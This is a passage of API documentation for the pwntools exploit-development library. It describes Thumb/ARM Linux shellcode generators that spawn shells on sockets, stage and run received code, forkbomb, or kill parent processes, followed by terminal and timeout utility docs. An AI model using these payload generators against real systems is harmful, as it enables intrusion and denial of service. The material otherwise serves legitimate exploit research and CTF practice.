against the peer port. Resulting socket is left in r6.</p>
</dd></dl>

<dl class="function">
<dt id="pwnlib.shellcraft.thumb.linux.findpeersh">
<code class="descclassname">pwnlib.shellcraft.thumb.linux.</code><code class="descname">findpeersh</code><span class="sig-paren">(</span><em>port</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/shellcraft/templates/thumb/linux/findpeersh.asm"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.shellcraft.thumb.linux.findpeersh" title="Permalink to this definition">¶</a></dt>
<dd><p>Finds a connected socket. If port is specified it is checked
against the peer port. A dup2 shell is spawned on it.</p>
</dd></dl>

<dl class="function">
<dt id="pwnlib.shellcraft.thumb.linux.findpeerstager">
<code class="descclassname">pwnlib.shellcraft.thumb.linux.</code><code class="descname">findpeerstager</code><span class="sig-paren">(</span><em>port=None</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/shellcraft/templates/thumb/linux/findpeerstager.asm"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.shellcraft.thumb.linux.findpeerstager" title="Permalink to this definition">¶</a></dt>
<dd><p>Findpeer recvsize stager
:param port, the port given to findpeer:
:type port, the port given to findpeer: defaults to any</p>
</dd></dl>

<dl class="function">
<dt id="pwnlib.shellcraft.thumb.linux.forkbomb">
<code class="descclassname">pwnlib.shellcraft.thumb.linux.</code><code class="descname">forkbomb</code><span class="sig-paren">(</span><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/shellcraft/templates/thumb/linux/forkbomb.asm"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.shellcraft.thumb.linux.forkbomb" title="Permalink to this definition">¶</a></dt>
<dd><p>Performs a forkbomb attack.</p>
</dd></dl>

<dl class="function">
<dt id="pwnlib.shellcraft.thumb.linux.forkexit">
<code class="descclassname">pwnlib.shellcraft.thumb.linux.</code><code class="descname">forkexit</code><span class="sig-paren">(</span><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/shellcraft/templates/thumb/linux/forkexit.asm"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.shellcraft.thumb.linux.forkexit" title="Permalink to this definition">¶</a></dt>
<dd><p>Attempts to fork.  If the fork is successful, the parent exits.</p>
</dd></dl>

<dl class="function">
<dt id="pwnlib.shellcraft.thumb.linux.killparent">
<code class="descclassname">pwnlib.shellcraft.thumb.linux.</code><code class="descname">killparent</code><span class="sig-paren">(</span><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/shellcraft/templates/thumb/linux/killparent.asm"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.shellcraft.thumb.linux.killparent" title="Permalink to this definition">¶</a></dt>
<dd><p>Kills its parent process until whatever the parent is (probably init)
cannot be killed any longer.</p>
</dd></dl>

<dl class="function">
<dt id="pwnlib.shellcraft.thumb.linux.listen">
<code class="descclassname">pwnlib.shellcraft.thumb.linux.</code><code class="descname">listen</code><span class="sig-paren">(</span><em>port</em>, <em>network</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/shellcraft/templates/thumb/linux/listen.asm"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.shellcraft.thumb.linux.listen" title="Permalink to this definition">¶</a></dt>
<dd><p>Listens on a TCP port, accept a client and leave his socket in r6.
Port is the TCP port to listen on, network is either &#8216;ipv4&#8217; or &#8216;ipv6&#8217;.</p>
</dd></dl>

<dl class="function">
<dt id="pwnlib.shellcraft.thumb.linux.loader">
<code class="descclassname">pwnlib.shellcraft.thumb.linux.</code><code class="descname">loader</code><span class="sig-paren">(</span><em>address</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/shellcraft/templates/thumb/linux/loader.asm"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.shellcraft.thumb.linux.loader" title="Permalink to this definition">¶</a></dt>
<dd><p>Loads a statically-linked ELF into memory and transfers control.</p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><strong>address</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#int" title="(in Python v2.7)"><em>int</em></a>) &#8211; Address of the ELF as a register or integer.</td>
</tr>
</tbody>
</table>
</dd></dl>

<dl class="function">
<dt id="pwnlib.shellcraft.thumb.linux.loader_append">
<code class="descclassname">pwnlib.shellcraft.thumb.linux.</code><code class="descname">loader_append</code><span class="sig-paren">(</span><em>data=None</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/shellcraft/templates/thumb/linux/loader_append.asm"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.shellcraft.thumb.linux.loader_append" title="Permalink to this definition">¶</a></dt>
<dd><p>Loads a statically-linked ELF into memory and transfers control.</p>
<p>Similar to loader.asm but loads an appended ELF.</p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><strong>data</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; If a valid filename, the data is loaded from the named file.
Otherwise, this is treated as raw ELF data to append.
If <code class="docutils literal"><span class="pre">None</span></code>, it is ignored.</td>
</tr>
</tbody>
</table>
<p>Example:</p>
<p>The following doctest is commented out because it doesn&#8217;t work on Travis
for reasons I cannot diagnose.  However, it should work just fine :-)</p>
<blockquote>
<div># &gt;&gt;&gt; gcc = process([&#8216;arm-linux-gnueabihf-gcc&#8217;,&#8217;-xc&#8217;,&#8217;-static&#8217;,&#8217;-Wl,-Ttext-segment=0x20000000&#8217;,&#8217;-&#8216;])
# &gt;&gt;&gt; gcc.write(&#8216;&#8217;&#8217;
# ... int main() {
# ...     printf(&#8220;Hello, %s!\n&#8221;, &#8220;world&#8221;);
# ... }
# ... &#8216;&#8217;&#8216;)
# &gt;&gt;&gt; gcc.shutdown(&#8216;send&#8217;)
# &gt;&gt;&gt; gcc.poll(True)
# 0
# &gt;&gt;&gt; sc = shellcraft.loader_append(&#8216;a.out&#8217;)
# &gt;&gt;&gt; run_assembly(sc).recvline()
# &#8216;Hello, world!n&#8217;</div></blockquote>
</dd></dl>

<dl class="function">
<dt id="pwnlib.shellcraft.thumb.linux.readfile">
<code class="descclassname">pwnlib.shellcraft.thumb.linux.</code><code class="descname">readfile</code><span class="sig-paren">(</span><em>path</em>, <em>dst='r6'</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/shellcraft/templates/thumb/linux/readfile.asm"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.shellcraft.thumb.linux.readfile" title="Permalink to this definition">¶</a></dt>
<dd><p>Args: [path, dst (imm/reg) = r6 ]
Opens the specified file path and sends its content to the specified file descriptor.
Leaves the destination file descriptor in r6 and the input file descriptor in r5.</p>
</dd></dl>

<dl class="function">
<dt id="pwnlib.shellcraft.thumb.linux.readn">
<code class="descclassname">pwnlib.shellcraft.thumb.linux.</code><code class="descname">readn</code><span class="sig-paren">(</span><em>fd</em>, <em>buf</em>, <em>nbytes</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/shellcraft/templates/thumb/linux/readn.asm"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.shellcraft.thumb.linux.readn" title="Permalink to this definition">¶</a></dt>
<dd><p>Reads exactly nbytes bytes from file descriptor fd into the buffer buf.</p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><ul class="first last simple">
<li><strong>fd</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#int" title="(in Python v2.7)"><em>int</em></a>) &#8211; fd</li>
<li><strong>buf</strong> (<em>void</em>) &#8211; buf</li>
<li><strong>nbytes</strong> (<em>size_t</em>) &#8211; nbytes</li>
</ul>
</td>
</tr>
</tbody>
</table>
</dd></dl>

<dl class="function">
<dt id="pwnlib.shellcraft.thumb.linux.recvsize">
<code class="descclassname">pwnlib.shellcraft.thumb.linux.</code><code class="descname">recvsize</code><span class="sig-paren">(</span><em>sock</em>, <em>reg='r1'</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/shellcraft/templates/thumb/linux/recvsize.asm"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.shellcraft.thumb.linux.recvsize" title="Permalink to this definition">¶</a></dt>
<dd><p>Recives 4 bytes size field
Useful in conjuncion with findpeer and stager
:param sock, the socket to read the payload from.:
:param reg, the place to put the size:
:type reg, the place to put the size: default ecx</p>
<p>Leaves socket in ebx</p>
</dd></dl>

<dl class="function">
<dt id="pwnlib.shellcraft.thumb.linux.sh">
<code class="descclassname">pwnlib.shellcraft.thumb.linux.</code><code class="descname">sh</code><span class="sig-paren">(</span><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/shellcraft/templates/thumb/linux/sh.asm"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.shellcraft.thumb.linux.sh" title="Permalink to this definition">¶</a></dt>
<dd><p>Execute a different process.</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">p</span> <span class="o">=</span> <span class="n">run_assembly</span><span class="p">(</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">thumb</span><span class="o">.</span><span class="n">linux</span><span class="o">.</span><span class="n">sh</span><span class="p">())</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;echo Hello&#39;</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
<span class="go">&#39;Hello\n&#39;</span>
</pre></div>
</div>
</dd></dl>

<dl class="function">
<dt id="pwnlib.shellcraft.thumb.linux.stage">
<code class="descclassname">pwnlib.shellcraft.thumb.linux.</code><code class="descname">stage</code><span class="sig-paren">(</span><em>fd=0</em>, <em>length=None</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/shellcraft/templates/thumb/linux/stage.asm"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.shellcraft.thumb.linux.stage" title="Permalink to this definition">¶</a></dt>
<dd><p>Migrates shellcode to a new buffer.</p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><ul class="first last simple">
<li><strong>fd</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#int" title="(in Python v2.7)"><em>int</em></a>) &#8211; Integer file descriptor to recv data from.
Default is stdin (0).</li>
<li><strong>length</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#int" title="(in Python v2.7)"><em>int</em></a>) &#8211; Optional buffer length.  If None, the first pointer-width
of data received is the length.</li>
</ul>
</td>
</tr>
</tbody>
</table>
<p class="rubric">Example</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">p</span> <span class="o">=</span> <span class="n">run_assembly</span><span class="p">(</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">stage</span><span class="p">())</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">sc</span> <span class="o">=</span> <span class="n">asm</span><span class="p">(</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">echo</span><span class="p">(</span><span class="s2">&quot;Hello</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">,</span> <span class="n">constants</span><span class="o">.</span><span class="n">STDOUT_FILENO</span><span class="p">))</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">p</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">sc</span><span class="p">))</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">sc</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
<span class="go">&#39;Hello\n&#39;</span>
</pre></div>
</div>
</dd></dl>

<dl class="function">
<dt id="pwnlib.shellcraft.thumb.linux.stager">
<code class="descclassname">pwnlib.shellcraft.thumb.linux.</code><code class="descname">stager</code><span class="sig-paren">(</span><em>sock</em>, <em>size</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/shellcraft/templates/thumb/linux/stager.asm"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.shellcraft.thumb.linux.stager" title="Permalink to this definition">¶</a></dt>
<dd><p>Read &#8216;size&#8217; bytes from &#8216;sock&#8217; and place them in an executable buffer and jump to it.
The socket will be left in r6.</p>
</dd></dl>

<dl class="function">
<dt id="pwnlib.shellcraft.thumb.linux.syscall">
<code class="descclassname">pwnlib.shellcraft.thumb.linux.</code><code class="descname">syscall</code><span class="sig-paren">(</span><em>syscall=None</em>, <em>arg0=None</em>, <em>arg1=None</em>, <em>arg2=None</em>, <em>arg3=None</em>, <em>arg4=None</em>, <em>arg5=None</em>, <em>arg6=None</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/shellcraft/templates/thumb/linux/syscall.asm"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.shellcraft.thumb.linux.syscall" title="Permalink to this definition">¶</a></dt>
<dd><dl class="docutils">
<dt>Args: [syscall_number, *args]</dt>
<dd>Does a syscall</dd>
</dl>
<p>Any of the arguments can be expressions to be evaluated by <code class="xref py py-func docutils literal"><span class="pre">pwnlib.constants.eval()</span></code>.</p>
<p class="rubric">Example</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">shellcraft</span><span class="o">.</span><span class="n">thumb</span><span class="o">.</span><span class="n">linux</span><span class="o">.</span><span class="n">syscall</span><span class="p">(</span><span class="mi">11</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="s1">&#39;sp&#39;</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span><span class="o">.</span><span class="n">rstrip</span><span class="p">()</span>
<span class="go">    /* call syscall(11, 1, &#39;sp&#39;, 2, 0) */</span>
<span class="go">    mov r0, #1</span>
<span class="go">    mov r1, sp</span>
<span class="go">    mov r2, #2</span>
<span class="go">    eor r3, r3</span>
<span class="go">    mov r7, #0xb</span>
<span class="go">    svc 0x41</span>
<span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">shellcraft</span><span class="o">.</span><span class="n">thumb</span><span class="o">.</span><span class="n">linux</span><span class="o">.</span><span class="n">syscall</span><span class="p">(</span><span class="s1">&#39;SYS_exit&#39;</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span><span class="o">.</span><span class="n">rstrip</span><span class="p">()</span>
<span class="go">    /* call exit(0) */</span>
<span class="go">    eor r0, r0</span>
<span class="go">    mov r7, #SYS_exit /* 1 */</span>
<span class="go">    svc 0x41</span>
<span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">pwnlib</span><span class="o">.</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">open</span><span class="p">(</span><span class="s1">&#39;/home/pwn/flag&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">rstrip</span><span class="p">()</span> 
<span class="go">    /* open(file=&#39;/home/pwn/flag&#39;, oflag=0, mode=0) */</span>
<span class="go">    /* push &#39;/home/pwn/flag\x00&#39; */</span>
<span class="go">    mov r7, #(0x6761 &gt;&gt; 8)</span>
<span class="go">    lsl r7, #8</span>
<span class="go">    add r7, #(0x6761 &amp; 0xff)</span>
<span class="go">    push {r7}</span>
<span class="go">    ldr r7, value_...</span>
<span class="go">    b value_..._after</span>
<span class="go">value_...: .word 0x6c662f6e</span>
<span class="go">value_..._after:</span>
<span class="go">    push {r7}</span>
<span class="go">    ldr r7, value_...</span>
<span class="go">    b value_..._after</span>
<span class="go">value_...: .word 0x77702f65</span>
<span class="go">value_..._after:</span>
<span class="go">    push {r7}</span>
<span class="go">    ldr r7, value_...</span>
<span class="go">    b value_..._after</span>
<span class="go">value_...: .word 0x6d6f682f</span>
<span class="go">value_..._after:</span>
<span class="go">    push {r7}</span>
<span class="go">    mov r0, sp</span>
<span class="go">    eor r1, r1</span>
<span class="go">    eor r2, r2</span>
<span class="go">    /* call open() */</span>
<span class="go">    mov r7, #SYS_open /* 5 */</span>
<span class="go">    svc 0x41</span>
</pre></div>
</div>
</dd></dl>

</div>
</div>
</div>
</div>
</div>
<span id="document-term"></span><div class="section" id="module-pwnlib.term">
<span id="pwnlib-term-terminal-handling"></span><h3><a class="reference internal" href="#module-pwnlib.term" title="pwnlib.term"><code class="xref py py-mod docutils literal"><span class="pre">pwnlib.term</span></code></a> &#8212; Terminal handling<a class="headerlink" href="#module-pwnlib.term" title="Permalink to this headline">¶</a></h3>
<dl class="function">
<dt id="pwnlib.term.can_init">
<code class="descclassname">pwnlib.term.</code><code class="descname">can_init</code><span class="sig-paren">(</span><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/term.py#L23-55"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.term.can_init" title="Permalink to this definition">¶</a></dt>
<dd><p>This function returns True iff stderr is a TTY and we are not inside a
REPL.  Iff this function returns <cite>True</cite>, a call to <a class="reference internal" href="#pwnlib.term.init" title="pwnlib.term.init"><code class="xref py py-meth docutils literal"><span class="pre">init()</span></code></a> will let
<code class="docutils literal"><span class="pre">pwnlib</span></code> manage the terminal.</p>
</dd></dl>

<dl class="function">
<dt id="pwnlib.term.init">
<code class="descclassname">pwnlib.term.</code><code class="descname">init</code><span class="sig-paren">(</span><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/term.py#L58-83"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.term.init" title="Permalink to this definition">¶</a></dt>
<dd><p>Calling this function will take over the terminal (iff <a class="reference internal" href="#pwnlib.term.can_init" title="pwnlib.term.can_init"><code class="xref py py-func docutils literal"><span class="pre">can_init()</span></code></a>
returns True) until the current python interpreter is closed.</p>
<p>It is on our TODO, to create a function to &#8220;give back&#8221; the terminal without
closing the interpreter.</p>
</dd></dl>

<dl class="data">
<dt id="pwnlib.term.term_mode">
<code class="descclassname">pwnlib.term.</code><code class="descname">term_mode</code><em class="property"> = False</em><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/term.py"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.term.term_mode" title="Permalink to this definition">¶</a></dt>
<dd><p>This is True exactly when we have taken over the terminal using <a class="reference internal" href="#pwnlib.term.init" title="pwnlib.term.init"><code class="xref py py-func docutils literal"><span class="pre">init()</span></code></a>.</p>
</dd></dl>

</div>
<span id="document-timeout"></span><div class="section" id="module-pwnlib.timeout">
<span id="pwnlib-timeout-timeout-handling"></span><h3><a class="reference internal" href="#module-pwnlib.timeout" title="pwnlib.timeout"><code class="xref py py-mod docutils literal"><span class="pre">pwnlib.timeout</span></code></a> &#8212; Timeout handling<a class="headerlink" href="#module-pwnlib.timeout" title="Permalink to this headline">¶</a></h3>
<p>Timeout encapsulation, complete with countdowns and scope managers.</p>
<dl class="class">
<dt id="pwnlib.timeout.Timeout">
<em class="property">class </em><code class="descclassname">pwnlib.timeout.</code><code class="descname">Timeout</code><span class="sig-paren">(</span><em>timeout=pwnlib.timeout.Timeout.default</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/timeout.py"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.timeout.Timeout" title="Permalink to this definition">¶</a></dt>
<dd><p>Implements a basic class which has a timeout, and support for
scoped timeout countdowns.</p>
<p>Valid timeout values are:</p>
<ul class="simple">
<li><code class="docutils literal"><span class="pre">Timeout.default</span></code> use the global default value (<code class="docutils literal"><span class="pre">context.default</span></code>)</li>
<li><code class="docutils literal"><span class="pre">Timeout.forever</span></code> or <code class="xref py py-const docutils literal"><span class="pre">None</span></code> never time out</li>
<li>Any positive float, indicates timeouts in seconds</li>
</ul>
<p class="rubric">Example</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">context</span><span class="o">.</span><span class="n">timeout</span> <span class="o">=</span> <span class="mi">30</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">t</span> <span class="o">=</span> <span class="n">Timeout</span><span class="p">()</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">t</span><span class="o">.</span><span class="n">timeout</span> <span class="o">==</span> <span class="mi">30</span>
<span class="go">True</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">t</span> <span class="o">=</span> <span class="n">Timeout</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">t</span><span class="o">.</span><span class="n">timeout</span> <span class="o">==</span> <span class="mi">5</span>
<span class="go">True</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span>
<span class="gp">&gt;&gt;&gt; </span><span class="k">with</span> <span class="n">t</span><span class="o">.</span><span class="n">countdown</span><span class="p">():</span>
<span class="gp">... </span>    <span class="nb">print</span> <span class="p">(</span><span class="mi">4</span> <span class="o">&lt;=</span> <span class="n">t</span><span class="o">.</span><span class="n">timeout</span> <span class="ow">and</span> <span class="n">t</span><span class="o">.</span><span class="n">timeout</span> <span class="o">&lt;=</span> <span class="mi">5</span><span class="p">)</span>
<span class="gp">...</span>
<span class="go">True</span>
<span class="gp">&gt;&gt;&gt; </span><span class="k">with</span> <span class="n">t</span><span class="o">.</span><span class="n">countdown</span><span class="p">(</span><span class="mf">0.5</span><span class="p">):</span>
<span class="gp">... </span>    <span class="k">while</span> <span class="n">t</span><span class="o">.</span><span class="n">timeout</span><span class="p">:</span>
<span class="gp">... </span>        <span class="nb">print</span> <span class="nb">round</span><span class="p">(</span><span class="n">t</span><span class="o">.</span><span class="n">timeout</span><span class="p">,</span><span class="mi">1</span><span class="p">)</span>
<span class="gp">... </span>        <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.1</span><span class="p">)</span>
<span class="go">0.5</span>
<span class="go">0.4</span>
<span class="go">0.3</span>
<span class="go">0.2</span>
<span class="go">0.1</span>
<span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">t</span><span class="o">.</span><span class="n">timeout</span>
<span class="go">5.0</span>
<span class="gp">&gt;&gt;&gt; </span><span class="k">with</span> <span class="n">t</span><span class="o">.</span><span class="n">local</span><span class="p">(</span><span class="mf">0.5</span><span class="p">):</span>
<span class="gp">... </span>    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">5</span><span class="p">):</span>
<span class="gp">... </span>        <span class="nb">print</span> <span class="nb">round</span><span class="p">(</span><span class="n">t</span><span class="o">.</span><span class="n">timeout</span><span class="p">,</span><span class="mi">1</span><span class="p">)</span>
<span class="gp">... </span>        <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.1</span><span class="p">)</span>
<span class="go">0.5</span>
<span class="go">0.5</span>
<span class="go">0.5</span>
<span class="go">0.5</span>
<span class="go">0.5</span>
<span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">t</span><span class="o">.</span><span class="n">timeout</span>
<span class="go">5.0</span>
</pre></div>
</div>
<dl class="method">
<dt id="pwnlib.timeout.Timeout.countdown">
<code class="descname">countdown</code><span class="sig-paren">(</span><em>timeout=pwnlib.timeout.Timeout.default</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/timeout.py#L175-198"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.timeout.Timeout.countdown" title="Permalink to this definition">¶</a></dt>
<dd><p>Scoped timeout setter.  Sets the timeout within the scope,
and restores it when leaving the scope.</p>
<p>When accessing <a class="reference internal" href="#pwnlib.timeout.Timeout.timeout" title="pwnlib.timeout.Timeout.timeout"><code class="xref py py-attr docutils literal"><span class="pre">timeout</span></code></a> within the scope, it will be
calculated against the time when the scope was entered, in a
countdown fashion.</p>
<p>If <code class="xref py py-const docutils literal"><span class="pre">None</span></code> is specified for <code class="docutils literal"><span class="pre">timeout</span></code>, then the current
timeout is used is made.  This allows <code class="xref py py-const docutils literal"><span class="pre">None</span></code> to be specified
as a default argument with less complexity.</p>
</dd></dl>

<dl class="method">
<dt id="pwnlib.timeout.Timeout.local">
<code class="descname">local</code><span class="sig-paren">(</span><em>timeout</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/timeout.py#L200-208"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.timeout.Timeout.local" title="Permalink to this definition">¶</a></dt>
<dd><p>Scoped timeout setter.  Sets the timeout within the scope,
and restores it when leaving the scope.</p>
</dd></dl>

<dl class="method">
<dt id="pwnlib.timeout.Timeout.timeout_change">
<code class="descname">timeout_change</code><span class="sig-paren">(</span><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/timeout.py#L169-173"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.timeout.Timeout.timeout_change" title="Permalink to this definition">¶</a></dt>
<dd><p>Callback for subclasses to hook a timeout change.</p>
</dd></dl>

<dl class="attribute">
<dt id="pwnlib.timeout.Timeout.default">
<code class="descname">default</code><em class="property"> = pwnlib.timeout.Timeout.default</em><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/timeout.py"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.timeout.Timeout.default" title="Permalink to this definition">¶</a></dt>
<dd><p>Value indicating that the timeout should not be changed</p>
</dd></dl>

<dl class="attribute">
<dt id="pwnlib.timeout.Timeout.forever">
<code class="descname">forever</code><em class="property"> = None</em><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/timeout.py"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.timeout.Timeout.forever" title="Permalink to this definition">¶</a></dt>
<dd><p>Value indicating that a timeout should not ever occur</p>
</dd></dl>

<dl class="attribute">
<dt id="pwnlib.timeout.Timeout.maximum">
<code class="descname">maximum</code><em class="property"> = pwnlib.timeout.maximum</em><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/timeout.py"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.timeout.Timeout.maximum" title="Permalink to this definition">¶</a></dt>
<dd><p>Maximum value for a timeout.  Used to get around platform issues
with very large timeouts.</p>
<p>OSX does not permit setting socket timeouts to 2**22.
Assume that if we receive a timeout of 2**21 or greater,
that the value is effectively infinite.</p>
</dd></dl>

<dl class="attribute">
<dt id="pwnlib.timeout.Timeout.timeout">
<code class="descname">timeout</code><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/timeout.py"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.timeout.Timeout.timeout" title="Permalink to this definition">¶</a></dt>
<dd><p>Timeout for obj operations.  By default, uses <code class="docutils literal"><span class="pre">context.timeout</span></code>.</p>
</dd></dl>

</dd></dl>

</div>
<span id="document-tubes"></span><div class="section" id="module-pwnlib.tubes">
<span id="pwnlib-tubes-talking-to-the-world"></span><h3><a class="reference internal" href="#module-pwnlib.tubes" title="pwnlib.tubes"><code class="xref py py-mod docutils literal"><span class="pre">pwnlib.tubes</span></code></a> &#8212; Talking to the World!<a class="headerlink" href="#module-pwnlib.tubes" title="Permalink to this headline">¶</a></h3>
<p>The pwnlib is not a big truck! It&#8217;s a series of tubes!</p>
<p>This is our library for talking to sockets, processes, ssh connections etc.
Our goal is to be able to use the same API for e.g. remote TCP servers, local
TTY-programs and programs run over over SSH.</p>
<p>It is organized such that the majority of the functionality is implemented
in <a class="reference internal" href="#module-pwnlib.tubes.tube" title="pwnlib.tubes.tube"><code class="xref py py-class docutils literal"><span class="pre">pwnlib.tubes.tube</span></code></a>. The remaining classes should only implement
just enough for the class to work and possibly code pertaining only to
that specific kind of tube.</p>
<div class="section" id="types-of-tubes">
<h4>Types of Tubes<a class="headerlink" href="#types-of-tubes" title="Permalink to this headline">¶</a></h4>
<div class="toctree-wrapper compound">
<span id="document-tubes/processes"></span><div class="section" id="module-pwnlib.tubes.process">
